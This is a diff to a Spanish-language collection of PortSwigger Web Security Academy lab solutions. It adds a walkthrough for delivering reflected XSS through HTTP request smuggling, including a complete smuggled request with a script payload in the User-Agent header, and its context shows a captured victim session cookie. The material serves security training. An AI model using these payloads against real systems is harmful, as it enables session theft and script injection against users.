@@ -814,6 +814,28 @@ Accept-Language: en-US
 Cookie: victim-fingerprint=x0I5pEGy04Dgy8e20sThcT1WS83zPPeC; secret=7Kwj9ztbTjKb7ir6vhoOtLq5S7XwR7WQ; session=4VUfBbaKXwzTjsMDAzgC8ecnDQhISoRV
 ```
 
+### [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
+
+#### Solución:
+
+Enviar la siguiente request:
+
+```
+POST / HTTP/1.1
+Host: LABID.web-security-academy.net
+Content-Length: 82
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=6 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+
+asd
+```
+
+En caso de que no se dé como resuelto el laboratorio, volver a enviarla hasta conseguirlo (esto se debe a que PortSwigger simula que la víctima navega por el sitio de forma intermitente).
+
 ---
 
 ## [OS command injection](https://portswigger.net/web-security/os-command-injection)
